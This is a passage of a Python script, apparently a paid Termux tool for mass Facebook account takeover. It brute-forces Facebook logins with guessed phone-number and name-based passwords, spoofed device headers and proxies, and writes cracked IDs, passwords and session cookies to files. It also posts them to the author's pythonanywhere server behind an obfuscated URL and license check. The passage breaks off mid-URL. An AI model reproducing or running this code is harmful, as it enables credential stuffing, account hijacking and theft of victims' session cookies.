Mozilla/5.0 (Linux; Android 11; vivo 1933; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 9; vivo 1723 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 10; vivo 1818; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1851 Build/PKQ1.180819.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 7.0; vivo 1714 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1909 Build/PKQ1.190302.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 9; vivo 1916 Build/PKQ1.190626.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; V2037; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.8
Mozilla/5.0 (Linux; Android 12; V2031; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 12; V2060; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1915; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1816 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; V2101; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.5
Mozilla/5.0 (Linux; Android 12; vivo 1938; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1908 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1823 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 9; vivo 1915 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1951; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.5
Mozilla/5.0 (Linux; Android 10; vivo 1909; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 12; vivo 1909; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.7
Mozilla/5.0 (Linux; Android 12; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; V2101; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.8
Mozilla/5.0 (Linux; Android 12; V2129; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6
Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.7
Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.8
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.1
Mozilla/5.0 (Linux; Android 11; V2043; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 12; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1817 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1816 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1908 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.6'''.splitlines()
try:
    import pycurl
    from io import BytesIO
except:
    os.system('pip install pycurl')
    import pycurl
    from io import BytesIO
try:import pycurl
except:os.system('pkg uninstall python;pkg install python -y;pip install pycurl')
try:import pycurl
except:print('\n Pycurl Module Error!\n Contact With Owner! ');exit()

try:
    os.system('clear')
    print(' trying to connect ResistX server')
    abc = {'1':'a','2':'b','3':'c','4':'d','5':'e','6':'f','7':'g','8':'h','9':'i','10':'j','11':'k','12':'l','13':'m','14':'n','15':'o','16':'p','17':'q','18':'r','19':'s','20':'t','21':'u','22':'v','23':'w','24':'x','25':'y','26':'z','27':':','28':'/','29':'.','30':'279','31':'-','32':'*','33':'?','34':'=','35':'&'}
    p = 'python'
    r= 'anywhere'
    
    
    lik=(f"{abc['8']}{abc['20']}{abc['20']}{abc['16']}{abc['19']}{abc['27']}{abc['28']}{abc['28']}{abc['18']}{abc['5']}{abc['19']}{abc['9']}{abc['19']}{abc['20']}{abc['24']}{abc['29']}{p}{r}{abc['29']}{abc['3']}{abc['15']}{abc['13']}")
    #print(lik)
    buffer = BytesIO()
    c = pycurl.Curl()
    c.setopt(c.URL, lik)
    c.setopt(c.WRITEDATA, buffer)
    c.perform()
    c.close()
    body = buffer.getvalue().decode('utf-8')
    response = body
    try:
        
        response_data = json.loads(response)
        current = '0.2'
        ver = str(response_data['version'])
        server = str(response_data['server'])
        if server == str('on'):
            print(' connected to server ')
        
        elif server == str('off'):
            exit(' the server of this command is temprory off :( ')
        else:
            print(' something went wrong')
    except Exception as e:
        exit()
#except pycurl.error as e:
#    # Check if it's a connection error
#    if "Couldn't resolve host" in str(e) or "Failed to connect" in str(e):
#        exit("Connection Lost")
except Exception as e:
    #print(e)
    if "Could not resolve host" in str(e) or "Failed to connect" in str(e):
        exit(' connection lost ')
        #exit('something went wrong')
    else:
        exit()
def main():
    secu()
def secu():
    try:
        
        os.system('clear')
        print(' checking updates :(')
        abc = {'1':'a','2':'b','3':'c','4':'d','5':'e','6':'f','7':'g','8':'h','9':'i','10':'j','11':'k','12':'l','13':'m','14':'n','15':'o','16':'p','17':'q','18':'r','19':'s','20':'t','21':'u','22':'v','23':'w','24':'x','25':'y','26':'z','27':':','28':'/','29':'.','30':'279','31':'-','32':'*','33':'?','34':'=','35':'&'}
        p = 'python'
        r= 'anywhere'
        lik=(f"{abc['8']}{abc['20']}{abc['20']}{abc['16']}{abc['19']}{abc['27']}{abc['28']}{abc['28']}{abc['18']}{abc['5']}{abc['19']}{abc['9']}{abc['19']}{abc['20']}{abc['24']}{abc['29']}{p}{r}{abc['29']}{abc['3']}{abc['15']}{abc['13']}")
    #print(lik)
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, lik)
        c.setopt(c.WRITEDATA, buffer)
        c.perform()
        c.close()
        body = buffer.getvalue().decode('utf-8')
        response = body
        try:
        
            response_data = json.loads(response)
            current = '0.1'
            ver = str(response_data['version'])
            server = str(response_data['server'])
            if ver == str('0.9'):
                print(' already upto date :) ')
                secx()
            else:
                print(' update found newer version')
                os.system('rm -rf r32* r64* ')
                os.system('python resistx.py')
        except Exception as e:
            print(e)
       
    except Exception as e:
        if "Could not resolve host" in str(e) or "Failed to connect" in str(e):
            exit(' connection lost ')
        else:
            exit()
myid=uuid.uuid4().hex[:5].upper()
try:
    key1 = open('/data/data/com.termux/files/usr/bin/.res-cov', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.res-cov', 'w');kok.write(myid);kok.close()
uid = os.getuid()
key1 = open('/data/data/com.termux/files/usr/bin/.res-cov', 'r').read()
realkey=(f"xerx-subscription@:{uid}TS{key1}110E==")
key2 = base64.b64encode(str(f"{realkey}").encode('utf-8'))
key=(f"{key2}")
fkeyx = key.replace("b'","").replace("'","")

def secx():
    try:
        global myuid, uid, key1, realkey, key2, key, fkeyx
        
        #logo()
        abc = {'1':'a','2':'b','3':'c','4':'d','5':'e','6':'f','7':'g','8':'h','9':'i','10':'j','11':'k','12':'l','13':'m','14':'n','15':'o','16':'p','17':'q','18':'r','19':'s','20':'t','21':'u','22':'v','23':'w','24':'x','25':'y','26':'z','27':':','28':'/','29':'.','30':'279','31':'-','32':'*','33':'?','34':'=','35':'&'}
        p = 'python'
        r= 'anywhere'
        verk = 'verify'
        lik=(f"{abc['8']}{abc['20']}{abc['20']}{abc['16']}{abc['19']}{abc['27']}{abc['28']}{abc['28']}{abc['18']}{abc['5']}{abc['19']}{abc['9']}{abc['19']}{abc['20']}{abc['24']}{abc['29']}{p}{r}{abc['29']}{abc['3']}{abc['15']}{abc['13']}{abc['28']}{abc['18']}{abc['5']}{abc['19']}{abc['9']}{abc['19']}{abc['20']}{abc['24']}{abc['28']}{verk}{abc['28']}{fkeyx}")
        #print(lik)
        buffer = BytesIO()
        c = pycurl.Curl()
        c.setopt(c.URL, lik)
        c.setopt(c.WRITEDATA, buffer)
        c.perform()
        c.close()
        body = buffer.getvalue().decode('utf-8')
        response = body
        try:
        
            response_data = json.loads(response)
            testx = json.loads(response)
            
            
            if response_data['Status'] =='valid' and response_data['real'] ==f'{realkey}':
                #print('valid')
                #print(fkeyx);time.sleep(21)
                linkk = 'https://xerxserver.pythonanywhere.com/get_total'
                buffer = BytesIO()
                c = pycurl.Curl()
                c.setopt(c.URL, linkk)
                c.setopt(c.WRITEDATA, buffer)
                c.perform()
                c.close()
                body = buffer.getvalue().decode('utf-8')
                responset = body
                rrj = json.loads(responset)
                #print(rrj)
                #{'current_total':
                xerx(response_data['expiry'],rrj['current_total'])
            elif response_data['Status'] =='valid' and not response_data['real'] ==f'{realkey}':
                exit(' used same key 2 times :( contact admin  ')
            elif response_data['Status'] =='Expired':
                logo()
                print(f' key = {fkeyx}')
                print('\n Your subscription has been expired. buy new subscription')
                subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+916392909152&text="+(" Hi ResistX admin my subscription has been expired  Please Approve My Token\n Token:- "+ fkeyx)]);time.sleep(2)
                secx()
            elif response_data['Status'] =='Error':
                logo()
                print(f' key = {fkeyx}')
                print('\n Note :- its paid tool you need to buy first buy subscription of it :)')
                
                
                subprocess.check_output(["am", "start", "https://api.whatsapp.com/send?phone=+9779817359044&text="+(" Hi  admin i want to buy your tool  Please Approve My Token\n Token:- "+ fkeyx)]);time.sleep(2)
                secx()
            #print(response_data);time.sleep(10)
        except json.decoder.JSONDecodeError:
            print('\n Turn off on aeroplane mode & try again.')
            exit()
        except Exception as e:
            exit()
       
    except Exception as e:
        if "Could not resolve host" in str(e) or "Failed to connect" in str(e):
            exit(' connection lost ')
        else:
            exit()


def ConvertCookie(cok,rn):
    try:
        sb     = re.search('sb=(.*?);',     str(cok)).group(1)
        datr   = rn
        c_user = re.search('c_user=(.*?);', str(cok)).group(1)
        xs     = re.search('xs=(.*?);',     str(cok)).group(1)
        fr     = re.search('fr=(.*?);',     str(cok)).group(1)
        cookie = f'{rn};sb={sb};fr={fr};c_user={c_user};xs={xs}'
    except Exception as e:
        cookie = cok
    return(cookie)
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"  \033[1;32m"+gm.replace('huwtn',' hxw-code=hannan-33'+'\033[0;m'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m  \033[1;93m"+gm.replace('riJan','Hxw-182^)Code=hannan-2233]'))


def send(txt):
    url = 'https://xerxserver.pythonanywhere.com/update_total'
    text_to_send = txt
    data = {
    'text': text_to_send}
    response = requests.post(url, json=data)

def logo():
    os.system('clear')
    logox = """
-------------------------------------------------------------
         >> Admin :- Xerx-Xd
-------------------------------------------------------------"""  
    print(logox)
def six():
    print(61*'-')
    
def xerx(exp,tl):
    logo()
    #print(f'{exp} {tl}')
    print(f' total id cloned from this update :- \033[1;32m{tl}\033[0;m')
    print(f' expiry date :- {exp}')
    six()
    print(' [1] file clone ')
    print(' [2] random clone ')
    six()
    user = input(' select option :- ')
    if user in ['1','01']:mthdm1();file()
    elif user in ['2','02']:mthdm1();country();randomx()
    else:
        print(' option not found ');time.sleep(3);xerx()


def randomx():
    global mthd
    logo()
    CrackMethod = mthd['method']
    us=[]
    cc = mthd['cc']
    print(' [^] input  4 digit sim code ')
    print(61*'-')
    code = input(' [^] input > ')
    print(61*'-')
    try:
        
         limit= int(input(" [•] Put Clone Limit : "))
         if limit =="":
            limit = 5000
        
    except:
        limit= 5000
    for _ in range(limit):
        #print(code)
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        us.append(nmp)
        #print(code+str(us))
    print(61*'-')
    with Thread(max_workers=35) as ddx:
        tl = str(len(us))
        logo()
        print('           use fake apn setting ')
        six()
        for _ in us:
            iid = code+_
            rn = iid[:6]
            rn2 = iid[:8]
            if cc =='np':
                passlist = [iid,_,iid[:8],iid[:7],iid[:6],'nepal12','nepal123','nepal1234','nepal12345','maya123','kathmandu','pokhara','tamang','maya1234','tamang123','nepal@123','kathmandu123','freefire']
            elif cc =='in':
                
                passlist = [iid,_,iid[:8],iid[:7],iid[:6],'57273200','59039200','57575751','07860786','57575752','57575752']
            else:
                exit(' country not selected')
            if CrackMethod == '1':
                ddx.submit(rm1,iid,passlist,tl)
            elif CrackMethod == '2':
                ddx.submit(rm2,iid,passlist,tl)
            elif CrackMethod == '3':
                ddx.submit(rm3,iid,passlist,tl)
            elif CrackMethod == '4':
                ddx.submit(rm4,iid,passlist,tl)
            elif CrackMethod == '5':
                ddx.submit(rm5,iid,passlist,tl)
    six()
    print(' The process has completed')
    print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    six()
def file():
    global mthd
    logo()
    CrackMethod = mthd['method']
    file = input(' Put file path : ')
    try:
        
        fo = open(file,'r').read().splitlines()
    except FileNotFoundError:
        print(' File location not found ');time.sleep(2);file()
    print(61*'-')
 
    plist=[]
    print(' [1] auto pass m1 slow ')
    print(' [2] auto pass m2 best ')
    print(' [3] manually add pass')
    six()
    tx = input(' choose option :- ')
    if tx in ['1','01']:
        plist.append('first last');plist.append('First Last');plist.append('first123');plist.append('first1234');plist.append('first12345');plist.append('first@123');plist.append('firstlast');plist.append('first@12345');plist.append('First123');plist.append('First@123456');plist.append('First@123');plist.append('First Last')
    elif tx in ['2','02']:
        plist.append('first last');plist.append('firstlast');plist.append('Firstlast');plist.append('first123');plist.append('first1234');plist.append('first12345');plist.append('first123456');plist.append('First@123');plist.append('First@12345');plist.append('first@123');plist.append('first@1234');plist.append('first@12345')
    else:
        
        logo()
        try:
            ps_limit = int(input(' How Many Pasword You Want To Add : '))
        except:
            ps_limit =1
        six()
        print(' exp :first last, firtslast, first123')
        six()
        for i in range(ps_limit):
            plist.append(input(f' Put Password No.{i+1}: '))
        six()
    six()
    
    cpp = input(' [*] do you wanna show cookie (y/n) :- ')
    if cpp in ['y','Y','1','YES']:
        ldd.append('y')
    six()
    cppx = input(' [*] do you wanna show apk (y/n) :- ')
    if cppx in ['y','Y','1','YES']:
        apc.append('y')
    six()
    cpx = input(' [*] do you wanna show cp $ 2fa? (y/n) :- ')
    if cpx in ['y','Y','1','YES']:
        okcp.append('y')
    with Thread(max_workers=30) as xerx:
        logo()
        tl = str(len(fo))
        #print(' Total account : '+tl)
        #print(" Use flight mode more then more for best result ")
        print('           use fake apn setting ')
        six()
        for user in fo:
            ids,names = user.split('|')
            
            passlist = plist
            #print(f'{ids}{names}{passlist}')
            #print(passlist)
            if CrackMethod == '1':
                xerx.submit(m1,ids,names,passlist,tl)
            elif CrackMethod == '2':
                xerx.submit(m2,ids,names,passlist,tl)
            elif CrackMethod == '3':
                xerx.submit(m3,ids,names,passlist,tl)
            elif CrackMethod == '4':
                xerx.submit(m4,ids,names,passlist,tl)
            elif CrackMethod == '5':
                xerx.submit(m5,ids,names,passlist,tl)
    six()
    print(' The process has completed')
    print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
    six()
def mthdm1():
    logo()
    global mthd
    print(' [1] method 1')
    print(' [2] method 2')
    print(' [3] method 3')
    print(' [4] method 4')
    print(' [5] method 5')
    print(61*'-')
    user = input(' Select option: ')
    if user == '1':
        mthd.update({"method": "1"})
        
    elif user == '2':
        mthd.update({"method": "2"})
    elif user == '3':
        mthd.update({"method": "3"})
    elif user == '4':
        mthd.update({"method": "4"})
    elif user == '5':
        mthd.update({"method": "5"})
    else:
        print(' invalid option');time.sleep(2);mthdm1()
def rm1(iid,passlist,tl):
    try:
        global oks,twf,loop
        sys.stdout.write(f"\r{loop}|{tl}; XERX|M1| OK: {len(oks)} \r")
        sys.stdout.flush()
        for ps in passlist:
            
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            #rr = random.choice
            #mode = f'Redmi {str(random.choice(4,9))}'
            proxy = {'https': 'socks5://'+random.choice(pro)}
            device_id = str(uuid.uuid4())
            secure = str(uuid.uuid4())
            family = str(uuid.uuid4())
            redmi_models = ["CPH1869","CPH1929","CPH2107","CPH2238","CPH2389","CPH2401","CPH2407","CPH2413","CPH2415","CPH2417","CPH2419","CPH2455","CPH2459","CPH2461","CPH2471","CPH2473","CPH2477","CPH8893","CPH2321","CPH2341","CPH2373","CPH2083","CPH2071","CPH2077","CPH2185","CPH2179","CPH2269","CPH2421","CPH2349","CPH2271","CPH1923","CPH1925","CPH1837","CPH2015","CPH2073","CPH2081","CPH2029","CPH2031","CPH2137","CPH1605","CPH1803","CPH1853","CPH1805","CPH1809","CPH1851","CPH1931","CPH1959","CPH1933","CPH1935","CPH1943","CPH2061","CPH2069","CPH2127","CPH2131","CPH2139","CPH2135","CPH2239","CPH2195","CPH2273","CPH2325","CPH2309","CPH1701","CPH2387","CPH1909","CPH1920","CPH1912","CPH1901","CPH1903","CPH1905","CPH1717","CPH1801","CPH2067","CPH2099","CPH2161","CPH2219","CPH2197","CPH2263","CPH2375","CPH2339","CPH1715","CPH2385","CPH1729","CPH1827","CPH1938","CPH1937","CPH1939","CPH1941","CPH2001","CPH2021","CPH2059","CPH2121","CPH2123","CPH2203","CPH2333","CPH2365","CPH1913","CPH1911","CPH1915","CPH1969","CPH2209","CPH1987","CPH2095","CPH2119","CPH2285","CPH2213","CPH2223","CPH2363","CPH1609","CPH1613","CPH1723","CPH1727","CPH1725","CPH1819","CPH1821","CPH1825","CPH1881","CPH1823","CPH1871","CPH1875","CPH2023","CPH2005","CPH2025","CPH2207","CPH2173","CPH2307","CPH2305","CPH2337","CPH1955","CPH1707","CPH1719","CPH1721","CPH1835","CPH1831","CPH1833","CPH1879","CPH1893","CPH1877","CPH1607","CPH1611","CPH1917","CPH1919","CPH1907","CPH1989","CPH1945","CPH1951","CPH2043","CPH2035","CPH2037","CPH2036","CPH2009","CPH2013","CPH2113","CPH2091","CPH2125","CPH2109","CPH2089","CPH2065","CPH2159","CPH2145","CPH2205","CPH2201","CPH2199","CPH2217","CPH1921","CPH2211","CPH2235","CPH2251","CPH2249","CPH2247","CPH2237","CPH2371","CPH2293","CPH2353","CPH2343","CPH2359","CPH2357","CPH2457","CPH1983","CPH1979"]
            modx = random.choice(redmi_models)
            d = '{density=2.0,width=720,height=1280}'
            data = {'adid':str(adid), 'format': 'json', 'device_id': device_id, 'email': iid, 'password': ps, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': family, 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '62f8ce9f74b12f84c123cc23437a4a32', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(11, 99)}'
            head = {'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {modx} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(11, 99)};FBBV/{str(random.randint(000000000,999999999))};[FBAN/FB4A;FBAV/71.0.3578.141;FBBV/257460578;FBDM/{d};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Xiaomi {modx};FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '26849', 'X-FB-SIM-HNI': '22905', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url,data=data,headers=head).json()
            #print(po)
            if 'session_key' in po:
                try:
                    uid = po['uid']
                except:
                    uid = iid
                cookie = "; ".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                savec = cookie + f'; dpr=2; locale=en_US; wd=950x1835; m_page_voice={uid}'
                rn = lock_check(uid)
                if rn =='LIVE':
                    print(f'\033[1;32m [OK] {uid} | {ps} \033[0;m')
                    
                    open('/sdcard/r-ok.txt', 'a').write(f'{uid}|{ps}\n')
                    open('/sdcard/r-ok_with_cookies.txt', 'a').write(f'{uid}|{ps}|{savec}\n')
                    allx = f'{uid}|{ps}|{savec}'
                    send(allx)
                    oks.append(uid)
                    break
                else:
                    open('/sdcard/r-dead.id_with_cookies.txt', 'a').write(f'{uid}|{ps}|{savec}\n')
                    break
                
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\033[1;31m [CP] {iid} | {ps} \033[0;m')
                break
            elif 'two_factor' in str(po):
                print(f'\033[1;36m [2F] {iid} | {ps} \033[0;m')
                break
            elif "Calls to this api have exceeded the rate limit." in po["error"]["message"]:
                
                sys.stdout.write(f"\r{loop}|{tl}; \033[1;31mSPAM|M1| OK: {len(oks)} \r");sys.stdout.flush()
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(5)
    except Exception as e:
        print(e)
def rm2(iid,passlist,tl):
    global oks,twf,loop
    
    
    try:
        for ps in passlist:
            session = requests.Session()
            sys.stdout.write(f"\r{loop}|{tl}; XERX|M2| OK: {len(oks)} \r")
            sys.stdout.flush()
            
            rr = random.randint;rc = random.choice
            proxy = {'http': 'socks5://'+random.choice(pro)}
            mdl = ["Redmi Note 11","Redmi 10","Redmi K40","Redmi 9","Redmi Note 10","Redmi 8","Redmi Note 9 Pro"]
            uau = "Mozilla/5.0 (Linux; Android "+str(random.randint(4,13))+"; "+str(random.choice(mdl))+" Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/"+str(random.randint(84,106))+".0."+str(random.randint(4200,4900))+"."+str(random.randint(40,140))+" Mobile Safari/537.36"
            m2f = session.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=159513024983374&kid_directed_site=0&app_id=159513024983374&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D159513024983374%26redirect_uri%3Dhttps%253A%252F%252Faccounts.icc-cricket.com%252F4ba9f276-2497-440e-a6ba-d05d4831b967%252Foauth2%252Fauthresp%26response_type%3Dcode%26scope%3Demail%2Bpublic_profile%26state%3DStateProperties%253DeyJTSUQiOiJ4LW1zLWNwaW0tcmM6MzI4MjQ4ZjAtNWQ5ZS00YmFjLWEyMDUtYjI4NTBlNmYzMDdjIiwiVElEIjoiNDE5OTNmYmEtYzg0Yy00N2YxLWFhMTAtNjBkNDIxNDdhMzQ1IiwiVE9JRCI6IjRiYTlmMjc2LTI0OTctNDQwZS1hNmJhLWQwNWQ0ODMxYjk2NyJ9%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D3b7e0aa4-9d25-4092-809a-78adc3fe1831%26tp%3Dunspecified&cancel_url=https%3A%2F%2Faccounts.icc-cricket.com%2F4ba9f276-2497-440e-a6ba-d05d4831b967%2Foauth2%2Fauthresp%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DStateProperties%253DeyJTSUQiOiJ4LW1zLWNwaW0tcmM6MzI4MjQ4ZjAtNWQ5ZS00YmFjLWEyMDUtYjI4NTBlNmYzMDdjIiwiVElEIjoiNDE5OTNmYmEtYzg0Yy00N2YxLWFhMTAtNjBkNDIxNDdhMzQ1IiwiVE9JRCI6IjRiYTlmMjc2LTI0OTctNDQwZS1hNmJhLWQwNWQ0ODMxYjk2NyJ9%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&rtime=1704667062&subno_key=AaGN11iBzQkbobWAE8sNNrZNyn